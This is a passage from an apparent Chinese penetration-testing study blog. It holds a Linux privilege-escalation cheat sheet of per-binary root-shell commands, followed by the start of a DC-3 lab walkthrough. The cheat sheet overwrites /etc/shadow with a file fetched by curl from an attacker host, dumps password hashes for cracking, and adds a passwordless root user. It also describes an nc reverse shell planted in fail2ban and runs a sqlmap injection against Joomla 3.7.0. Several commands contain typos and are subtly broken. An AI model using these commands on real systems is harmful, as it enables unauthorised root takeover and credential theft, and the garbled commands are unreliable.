输入root:$6$hUrZGcm9PHFWibnM$O4IX3xDqyfL1kp1MdUrbg3xgToPHpUR4cc8hqwRVB24zGwXCeuu8uGzDFYpQvwJ6BctAw0q468lbzr0hj5ndy1:19850:0:99999:7:::</span><br></code></pre></td></tr></table></figure><p>将我们写好用户名密码的文件部署到服务器上，然后通过<code>curl</code>命令进行下载覆盖掉机器中的<code>/etc/shadow</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http:/192.168.31.221/root_shadow -o /etc/shadow<br></code></pre></td></tr></table></figure><h1 id="date"><a href="#date" class="headerlink" title="date"></a>date</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">date</span> -f /etc/shadow<br></code></pre></td></tr></table></figure><p>通过报错获取root用户的加密密码，在通过john破解获得root的密码进行登录</p><h1 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h1><p>通过使用kali生成明文密码的hash，通过使用下方命令加密一段明文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 admin<span class="hljs-comment"># $6$hUrZGcm9PHFWibnM$O4IX3xDqyfL1kp1MdUrbg3xgToPHpUR4cc8hqwRVB24zGwXCeuu8uGzDFYpQvwJ6BctAw0q468lbzr0hj5ndy1</span><br></code></pre></td></tr></table></figure><p>参考<code>/etc/shadow</code>文件中root用户的hash值保存起来到一个文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim root_shadow<br><span class="hljs-comment"># 输入root:$6$hUrZGcm9PHFWibnM$O4IX3xDqyfL1kp1MdUrbg3xgToPHpUR4cc8hqwRVB24zGwXCeuu8uGzDFYpQvwJ6BctAw0q468lbzr0hj5ndy1:19850:0:99999:7:::</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:$6$hUrZGcm9PHFWibnM$O4IX3xDqyfL1kp1MdUrbg3xgToPHpUR4cc8hqwRVB24zGwXCeuu8uGzDFYpQvwJ6BctAw0q468lbzr0hj5ndy1:19850:0:99999:7:::&#x27;</span> | <span class="hljs-built_in">dd</span> of=/etc/shadow<br></code></pre></td></tr></table></figure><h1 id="dstat"><a href="#dstat" class="headerlink" title="dstat"></a>dstat</h1><p>先构建一个以<code>dstat_</code>为前缀的python文件，如<code>dstat_redshell.py</code>，然后再里面写入<code>import os;os.execv(&quot;/bin/bash&quot;,[&quot;bash&quot;])</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim dstat_redshell.py<br><span class="hljs-comment"># 写入import os;os.execv(&quot;/bin/bash&quot;,[&quot;bash&quot;])</span><br><span class="hljs-built_in">cp</span> dstat_redshell.py /usr/share/dstat/<br>sudo dstat --redshell<br></code></pre></td></tr></table></figure><h1 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h1><p>要求exiftool版本：7.44-12.23</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">exiftool -<span class="hljs-built_in">ver</span><br></code></pre></td></tr></table></figure><p>编写一个payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> payload<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;(metadata &quot;\c$&#123;system(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&#125;;&quot;)&#x27;</span> &gt; payload<br>bzz payload payload.bzz<br>djvumake exploit.djvu INFO=<span class="hljs-string">&#x27;1,1&#x27;</span> BGjp=/dev/null ANTz=payload.bzz<br>exiftool exploit.djvu<br></code></pre></td></tr></table></figure><h1 id="expect"><a href="#expect" class="headerlink" title="expect"></a>expect</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">expect -c <span class="hljs-string">&quot;spawn /bin/bash;interact&quot;</span><br></code></pre></td></tr></table></figure><h1 id="fail2ban"><a href="#fail2ban" class="headerlink" title="fail2ban"></a>fail2ban</h1><p><strong>条件：</strong><br>fail2ban用来反复登陆ssh登陆超过几次，或者在指定时间内登陆超过几次就禁止访问，IP封掉，是一个防御的工具<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231942840.jpeg" alt="img"><br><strong>利用流程：</strong><br>查找fail2ban的目录<br>再次查找fail2ban的配置中action目录中是否可写<br>-writable 可写<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231942249.jpeg" alt="img"></p><p>看一下fail2ban配置文件<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231942214.jpeg" alt="img"><br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231942664.jpeg" alt="img"><br>也就是说在这个时间段内，如果你尝试了5次都失败了，就会被ban掉，ban掉这个行为就是在action.d脚本目录中进行规定<br>看能否定义action的行为<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231943434.jpeg" alt="img"><br>这个文件中决定了尝试次数，在短时间内触发了ban这个行为的时候，怎么处置<br>查看得知这个文件是root用户root组，不可写<br>通过mv移动文件和cp复制文件的方式进行替换用户权限<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231943242.jpeg" alt="img"><br>现在就可以执行修改了，修改如果ban被触发时，执行的命令<br>修改成我们提取的逻辑<br>rm &#x2F;tmp&#x2F;f 删除临时文件夹的这个文件<br>mkfifo 做一个隧道，用“|”指定到bash<br>-i 指定交互性 2&gt;&amp;1 错误重定向输出<br>nc 10.10.10.10 9595 用nc反弹监听9595端口<br>&gt; &#x2F;tmp&#x2F;f 重定向到&#x2F;tmp&#x2F;f，形成闭环<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231943734.jpeg" alt="img"><br>重启fail2ban<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231943295.jpeg" alt="img"><br>回到kali多次登陆，看能否触发ban规则，规则就是我们写的提权逻辑<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231943396.jpeg" alt="img"><br>看到已经收到了反弹shall，命令提示符中有#号<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231943735.jpeg" alt="img"></p><h1 id="flock"><a href="#flock" class="headerlink" title="flock"></a>flock</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flock -u / /bin/bash<br></code></pre></td></tr></table></figure><h1 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gcc -wrapper /bin/bash,-s .<br></code></pre></td></tr></table></figure><h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb -nx -ex <span class="hljs-string">&#x27;!bash&#x27;</span> -ex quit<br></code></pre></td></tr></table></figure><h1 id="gzip-gunzip"><a href="#gzip-gunzip" class="headerlink" title="gzip&#x2F;gunzip"></a>gzip&#x2F;gunzip</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gzip -f /etc/shadow -t<br></code></pre></td></tr></table></figure><p>获取得到shadow中root用户加密的密码后进行爆破获取密码；</p><h1 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hping3<br>/bin/bash<br></code></pre></td></tr></table></figure><h1 id="iftop"><a href="#iftop" class="headerlink" title="iftop"></a>iftop</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">iftop<br>!<br>/bin/bash<br></code></pre></td></tr></table></figure><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><p>可以实现，去查查资料，这里不写</p><h1 id="jjs"><a href="#jjs" class="headerlink" title="jjs"></a>jjs</h1><p>可以实现，去查查资料，这里不写</p><h1 id="journalctl"><a href="#journalctl" class="headerlink" title="journalctl"></a>journalctl</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">journalct<br>!/bin/bash<br></code></pre></td></tr></table></figure><h1 id="knife"><a href="#knife" class="headerlink" title="knife"></a>knife</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">knife <span class="hljs-built_in">exec</span> -E <span class="hljs-string">&#x27;exec &quot;/bin/bash&quot;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -o <span class="hljs-built_in">bind</span> /bin/bash /usr/bin/mount<br></code></pre></td></tr></table></figure><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -e <span class="hljs-string">&#x27;\! /bin/bash&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="neofetch"><a href="#neofetch" class="headerlink" title="neofetch"></a>neofetch</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">redshell=<span class="hljs-comment">#(mktemp)</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec /bin/bash&#x27;</span> &gt; <span class="hljs-variable">$redshell</span><br>neofetch --config <span class="hljs-variable">$redshell</span><br></code></pre></td></tr></table></figure><h1 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nice</span> /bin/bash<br></code></pre></td></tr></table></figure><h1 id="node"><a href="#node" class="headerlink" title="node"></a>node</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -e <span class="hljs-string">&quot;require(&#x27;child_process&#x27;).spawn(&#x27;/bin/bash&#x27;,&#123;stdio:[0,1,2]&#125;)&quot;</span><br></code></pre></td></tr></table></figure><h1 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> /bin/bash -c <span class="hljs-string">&quot;bash &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&quot;</span><br></code></pre></td></tr></table></figure><h1 id="openvpn"><a href="#openvpn" class="headerlink" title="openvpn"></a>openvpn</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openvpn --config /etc/shadow<br></code></pre></td></tr></table></figure><p>获取得到shadow中root用户加密的密码后进行爆破获取密码；</p><h1 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd root<br></code></pre></td></tr></table></figure><p>具有passwd的root权限直接修改root用户的密码即可</p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&quot;system(&#x27;/bin/bash&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><h1 id="pico"><a href="#pico" class="headerlink" title="pico"></a>pico</h1><p>使用pico随便打开一个文件，通过<code>ctrl+x</code>执行命令，并输入<code>reset;bash 1&gt;&amp;0 2&gt;&amp;0</code>执行命令即可提权；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">nano any.txt<br>ctrl+x<br>reset;bash 1&gt;&amp;0 2&gt;&amp;0<br><span class="hljs-comment"># 回车</span><br></code></pre></td></tr></table></figure><h1 id="pkexec"><a href="#pkexec" class="headerlink" title="pkexec"></a>pkexec</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pkexec /bin/bash<br></code></pre></td></tr></table></figure><h1 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pyhton3 -c <span class="hljs-string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h1 id="rvim"><a href="#rvim" class="headerlink" title="rvim"></a>rvim</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rvim -c <span class="hljs-string">&#x27;:python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;reset;exec bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h1><p>和tmux原理相同，直接执行“screen”命令即可</p><h1 id="script"><a href="#script" class="headerlink" title="script"></a>script</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">script -q /dev/null<br></code></pre></td></tr></table></figure><h1 id="service"><a href="#service" class="headerlink" title="service"></a>service</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service ../../bin/bash<br></code></pre></td></tr></table></figure><h1 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat stdin <span class="hljs-built_in">exec</span>:/bin/bash<br></code></pre></td></tr></table></figure><h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -o ProxyCommand=<span class="hljs-string">&#x27;;bash 0&lt;&amp;2 1&gt;&amp;2&#x27;</span> x<br></code></pre></td></tr></table></figure><h1 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h1><p>首先编写一个C语言程序<code>redshell.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span>__<span class="hljs-title function_">attribute__</span><span class="hljs-params">((construtor))</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span>&#123;<br>    setuid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -share -fPIC -o redshell.so redshell.c<br><span class="hljs-built_in">ls</span> -liah redshell.so<br>ssh-keygen -D ./redshell.so<br></code></pre></td></tr></table></figure><h1 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -o /dev/null /bin/bash<br></code></pre></td></tr></table></figure><h1 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl<br>!/bin/bash<br></code></pre></td></tr></table></figure><h1 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h1><p>碰到再总结，这个确实能行</p><h1 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h1><p>碰到再总结，这个确实能行</p><h1 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">timedatectl list-timezones<br>!/bin/bash<br></code></pre></td></tr></table></figure><h1 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wall --nobanner /etc/shadow<br></code></pre></td></tr></table></figure><p>获取到加密的root用户的密码然后爆破</p><h1 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">watch -x bash -c <span class="hljs-string">&#x27;reset; exec bash 1&gt;&amp;0 2&gt;&amp;0&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="exim4"><a href="#exim4" class="headerlink" title="exim4"></a>exim4</h1><p>版本要求4.87-4.91，检查版本命令<code>exim --version</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br>searchsploit -m 46996.sh<br></code></pre></td></tr></table></figure><p>将下载到的<code>.sh</code>文件放到服务器上，然后再目标主机通过<code>wget</code>命令下载相应的文件执行即可</p><p>注意：目标主机只有有些目录具有访问权限能够下载文件，可以通过<code>ls -l</code>命令进行查询相应文件夹和文件的权限</p><h1 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;shell::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd<br>su shell<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>Linux提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-3打靶日记</title>
    <link href="/2024/05/23/dc-3%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/05/23/dc-3%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确定目标IP地址"><a href="#1-1-确定目标IP地址" class="headerlink" title="1.1 确定目标IP地址"></a>1.1 确定目标IP地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.31.0/24<br></code></pre></td></tr></table></figure><p>通过命令去扫描当前C端下存活的ip，以下是没有打开靶机时查看的ip地址；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221914228.png" alt="image-20240522191408191"></p><p>在打开靶机DC-3进行查询当前网段存活的IP地址：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221918940.png" alt="image-20240522191859909"></p><p>从而得到靶机的IP地址，并且可知其80端口处于开放状态，并启动的是http服务</p><blockquote><p>192.168.31.31</p></blockquote><h2 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h2><ol><li>开放的TCP端口扫描</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT --min-rate 10000 -p- 192.168.31.31 -oA nmapscan/ports<br></code></pre></td></tr></table></figure><p><code>-sT</code>：使用tcp三次握手的过程进行探测端口是否开放（相对较慢，但相对准确）；</p><p><code>-sS</code>：默认扫描方式，通过syn标志位进行检测链接是否开放（容易被防火墙挡住）；</p><p><code>-oA</code>：以全格式保存在后续的地址文件中，以三种不同的后缀文件名保存；</p><p><code>-min-rate</code>：指定默认扫描的速度，在正式的护网中要比10000还慢；</p><p><code>-p</code>：指定扫描端口， <code>-p-</code>：指从1到65535端口</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221929283.png" alt="image-20240522192938257"></p><blockquote><p>开放端口：80</p></blockquote><ol start="2"><li>扫描开放的UDP端口</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.31.31 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221934618.png" alt="image-20240522193406587"></p><blockquote><p>开放端口：53, 67, 68, 69, 123, 135, 137, 138, 139, 161, 162, 445, 500, 514, 520, 631, 1434, 1900, 4500, 49152</p></blockquote><ol start="3"><li>扫描开放的TCP端口的详细信息</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p80 192.168.31.31 -oA nmapscan/tcpportDetail<br></code></pre></td></tr></table></figure><p><code>-sV</code>：扫描提供服务的版本</p><p><code>-sC</code>：用默认的脚本进行扫描</p><p><code>-O</code>：扫描操作系统的版本</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221938156.png" alt="image-20240522193847122"></p><blockquote><p>并没有得到什么非常有用的信息</p></blockquote><ol start="4"><li>nmap漏扫</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p80 192.168.31.31 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221946102.png" alt="image-20240522194438087"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221946255.png" alt="image-20240522194506118"></p><blockquote><p>找到可能存在CSRF漏洞的目录</p><p>&#x2F;index.php</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;remind.remind&amp;Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?Itemid&#x3D;101  </p><p>&#x2F;index.php&#x2F;2-uncategorised&#x2F;1-welcome</p><p>还找到了一个Joomla的sql注入漏洞，Joomla的版本号为3.7.0</p><p>一个dos攻击</p></blockquote><h1 id="2-网页检索"><a href="#2-网页检索" class="headerlink" title="2. 网页检索"></a>2. 网页检索</h1><h2 id="2-1-only-one-flag"><a href="#2-1-only-one-flag" class="headerlink" title="2.1 only one flag"></a>2.1 only one flag</h2><p>根据刚才nmap扫面到的信息可以知道开启了http服务，通过访问网页能够得到的信息有：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221954996.png" alt="image-20240522195457949"></p><blockquote><p>欢迎来到 DC-3。</p><p>这一次，只有一个flag，一个入口，没有任何线索。</p><p>要获得标志，显然必须获得 root 权限。</p><p>如何成为 root 取决于你自己，当然，还有整个系统。</p><p>祝你好运，我希望你喜欢这个小小的挑战</p></blockquote><p>这已经很明显得到了这次的所有信息。</p><h2 id="2-2-指纹信息"><a href="#2-2-指纹信息" class="headerlink" title="2.2 指纹信息"></a>2.2 指纹信息</h2><p>通过工具知道该网页的CMS框架，编程语言、操作系统等等：</p><blockquote><p>CMS：Joomla</p><p>编程语言：php</p><p>操作系统：ubuntu</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405221956307.png" alt="image-20240522195638272"></p><h2 id="2-3-gubuster目录爆破"><a href="#2-3-gubuster目录爆破" class="headerlink" title="2.3 gubuster目录爆破"></a>2.3 gubuster目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.31.31 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222005770.png" alt="image-20240522200546723"></p><blockquote><p>得到的目录信息有</p><p><a href="http://192.168.31.31/images/">http://192.168.31.31/images/</a></p><p><a href="http://192.168.31.31/templates/">http://192.168.31.31/templates/</a></p><p><a href="http://192.168.31.31/media/">http://192.168.31.31/media/</a></p><p><a href="http://192.168.31.31/modules/">http://192.168.31.31/modules/</a></p><p><a href="http://192.168.31.31/bin/">http://192.168.31.31/bin/</a></p><p><a href="http://192.168.31.31/plugins/">http://192.168.31.31/plugins/</a></p><p><a href="http://192.168.31.31/includes/">http://192.168.31.31/includes/</a></p><p><a href="http://192.168.31.31/language/">http://192.168.31.31/language/</a></p><p><a href="http://192.168.31.31/components/">http://192.168.31.31/components/</a></p><p><a href="http://192.168.31.31/cache/">http://192.168.31.31/cache/</a></p><p><a href="http://192.168.31.31/libraries/">http://192.168.31.31/libraries/</a></p><p><a href="http://192.168.31.31/tmp/">http://192.168.31.31/tmp/</a></p><p><a href="http://192.168.31.31/layouts/">http://192.168.31.31/layouts/</a></p><p><a href="http://192.168.31.31/administrator/">http://192.168.31.31/administrator/</a></p><p><a href="http://192.168.31.31/cli/">http://192.168.31.31/cli/</a></p><p>发现了后台管理系统<code>http://192.168.31.31/administrator/</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222039616.png" alt="image-20240522203946565"></p><h2 id="2-4-漏洞搜索"><a href="#2-4-漏洞搜索" class="headerlink" title="2.4 漏洞搜索"></a>2.4 漏洞搜索</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222011370.png" alt="image-20240522201107173"></p><blockquote><p>搜索到的漏洞相当之多，可以进行的尝试也相当之多</p></blockquote><p>根据上述nmap扫描得到的版本号3.7.0，进行进一步的详细搜索</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla 3.7.0<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222046649.png" alt="image-20240522204654600"></p><p>查看器详细信息并复制到当前目录</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222047049.png" alt="image-20240522204743984"></p><p>根据漏洞记录的信息知道录用方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><p>在下一小节对其进行尝试</p><h3 id="metasploit"><a href="#metasploit" class="headerlink" 